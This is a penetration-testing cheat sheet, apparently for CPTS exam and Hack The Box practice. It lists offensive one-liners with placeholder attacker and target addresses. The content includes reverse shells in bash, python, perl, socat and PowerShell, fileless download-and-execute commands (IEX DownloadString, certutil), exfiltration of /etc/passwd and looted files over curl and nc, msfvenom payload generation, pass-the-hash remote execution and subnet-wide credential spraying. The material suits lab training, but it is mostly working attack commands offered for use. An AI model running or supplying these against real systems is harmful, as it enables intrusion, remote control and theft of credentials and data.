# CPTS One-Liner Cheatsheet (file transfer, shells, mount, exec)

Placeholders used everywhere:
- `ATT`  = your attack box IP (usually your tun0 / VPN IP, check with `ip a`)
- `PORT` = your listener port (e.g. 443, 4444, 9001)
- `TGT`  = target/victim IP
- `USER` `PASS` `DOMAIN` `NTHASH` = creds you have looted

================================================================
## MEMORIZE THESE (your one go-to per task, muscle memory)
================================================================
```bash
Serve files (attacker):      python3 -m http.server 80

Download (Linux target):     wget http://ATT/file -O /tmp/file

Download (Windows target):   iwr http://ATT/file -o C:\Windows\Temp\file

Reverse shell (Linux):       bash -c 'bash -i >& /dev/tcp/ATT/PORT 0>&1'

Reverse shell (Windows):     (use the PowerShell one-liner below, know where it is)

Listener (attacker):         nc -lvnp PORT          (or: pwncat-cs -lp PORT)

Stabilize Linux shell:       python3 -c 'import pty;pty.spawn("/bin/bash")'
                             then: Ctrl+Z ; stty raw -echo; fg ; (Enter twice)

SMB mount (Linux):           mount -t cifs //TGT/share /mnt -o 
username=USER,password=PASS

Run cmds w/ creds (Win):     evil-winrm -i TGT -u USER -p PASS
```
Everything below is the lookup library. Copy, do not memorize.

================================================================
## 1. SERVE / HOST FILES (on your attack box)
================================================================
```bash
python3 -m http.server 80                 # simplest, HTTP

php -S 0.0.0.0:80                          # if no python

python3 -m uploadserver 80                 # receive uploads (pip install uploadserver)

# SMB server (great for Windows targets):
impacket-smbserver share ./ -smb2support                     # anonymous

impacket-smbserver share ./ -smb2support -user u -password p # with creds
# FTP receive:  python3 -m pyftpdlib -w -p 21
```

================================================================
## 2. DOWNLOAD TO TARGET  (pull a file onto the victim)
================================================================
### Linux target

```bash
wget http://ATT/file -O /tmp/file

curl http://ATT/file -o /tmp/file
# no wget/curl (bash builtin):

exec 3<>/dev/tcp/ATT/80; echo -e "GET /file HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/file
# over nc:  (attacker) nc -lvnp 443 < file   (target) nc ATT 443 > /tmp/file
# with creds (pull from your box):  scp USER@ATT:/path/file /tmp/file
```
### Windows target

```powershell
# PowerShell (to disk):
iwr http://ATT/file -o C:\Windows\Temp\file
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATT/file','C:\Windows\Temp\file')"

# PowerShell fileless (run a script in memory):
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATT/x.ps1')"

# certutil:
certutil -urlcache -f http://ATT/file C:\Windows\Temp\file.exe

# bitsadmin:
bitsadmin /transfer job http://ATT/file C:\Windows\Temp\file
# modern curl.exe (Win10+): curl http://ATT/file -o C:\Windows\Temp\file
# SMB (run impacket-smbserver on attacker first):
copy \\ATT\share\file C:\Windows\Temp\file
```

================================================================
## 3. UPLOAD FROM TARGET  (exfil a file back to you)
================================================================
### Linux target

```bash
# needs uploadserver running on attacker:
curl -F 'files=@/etc/passwd' http://ATT/
# over nc:  (attacker) nc -lvnp 443 > out   (target) nc ATT 443 < /etc/passwd
# with creds:  scp /path/file USER@ATT:/tmp/file
# tiny files via base64 copy-paste:  base64 -w0 /path/file   -> paste -> base64 -d on attacker
```
### Windows target
```powershell
# SMB (impacket-smbserver on attacker):  copy C:\loot.txt \\ATT\share\
# PowerShell upload to uploadserver:
powershell -c "Invoke-RestMethod -Uri http://ATT/ -Method Post -InFile C:\loot.txt"
# base64 small file:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot"))
```

================================================================
## 4. REVERSE SHELLS  (target connects back; start a listener first)
================================================================
### Linux target

```bash
bash -c 'bash -i >& /dev/tcp/ATT/PORT 0>&1'

sh -i >& /dev/tcp/ATT/PORT 0>&1                     # when no bash

# nc without -e (most common):
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATT PORT >/tmp/f

# python3:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATT",PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/bash","-i"])'

# socat FULL TTY (best):  target:
socat TCP:ATT:PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
#   attacker listener:  socat file:`tty`,raw,echo=0 TCP-L:PORT
# perl:  perl -e 'use Socket;$i="ATT";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Windows target

```bash
# PowerShell one-liner (classic, copy as one line):
powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('ATT',PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"
# nc.exe (if you got it onto the box):  nc.exe ATT PORT -e cmd.exe
# ConPtyShell (fully interactive Windows shell) and powercat are the upgrade options.
# msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATT LPORT=PORT -f exe -o s.exe
```

================================================================
## 5. STABILIZE / UPGRADE A DUMB SHELL
================================================================
### Linux (after catching a basic nc shell)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'     # or python / script /dev/null -c bash
export TERM=xterm
# then background and fix the tty:
Ctrl+Z
stty raw -echo; fg
# press Enter twice. Now Ctrl+C, arrows, tab, and clear all work.
# set terminal size (run 'stty size' in your own term to get ROWS COLS):
stty rows ROWS cols COLS
```
Tip: `pwncat-cs -lp PORT` as your listener auto-stabilizes Linux shells for you.
`rlwrap nc -lvnp PORT` gives arrow-key history even on a raw shell.

================================================================
## 6. MOUNT SHARES
================================================================
### SMB (Linux)

``` bash
smbclient -L //TGT/ -U USER            # list shares  ( -N for anonymous )

smbclient //TGT/share -U USER          # interactive  ( get/put files )

mount -t cifs //TGT/share /mnt -o username=USER,password=PASS,domain=DOMAIN
mount -t cifs //TGT/share /mnt -o guest      # anonymous
```
### NFS (Linux)

```bash
showmount -e TGT                       # list exports

mount -t nfs TGT:/export /mnt -o nolock
# (NFS no_root_squash + local root = classic privesc path: own a SUID file in the share)
```
### SMB (Windows)

```powershell
net use Z: \\TGT\share /user:DOMAIN\USER PASS
net use \\TGT\IPC$ /user:USER PASS     # authenticate without mapping a drive
```

================================================================
## 7. RUN COMMANDS ON WINDOWS WITH CREDS OR A HASH
================================================================
```bash
evil-winrm -i TGT -u USER -p PASS                 # (or:  -H NTHASH  for pass-the-hash)

impacket-psexec   DOMAIN/USER:PASS@TGT            # SYSTEM shell  (-hashes :NTHASH)

impacket-wmiexec  DOMAIN/USER:PASS@TGT            # quieter, no service created

impacket-smbexec  DOMAIN/USER:PASS@TGT
# netexec (crackmapexec successor) - spray, exec, enumerate:

nxc smb TGT -u USER -p PASS                        # add --local-auth for local accounts

nxc smb TGT -u USER -H NTHASH -x "whoami"          # pass-the-hash + run a command

nxc smb SUBNET/24 -u USER -p PASS                  # spray a whole subnet (find where creds work)
```

================================================================
## HOW TO DRILL THIS (so it sticks without cramming)
================================================================
- Memorize ONLY the top box. That is maybe 9 lines.
- For everything else, know the CATEGORY exists and that it is in this file.
- On every HTB box, force yourself to transfer a file both ways and to stabilize
  the shell, even when you do not need to. Reps build the muscle memory.
- Keep ATT/PORT the same across a session so the commands become automatic.

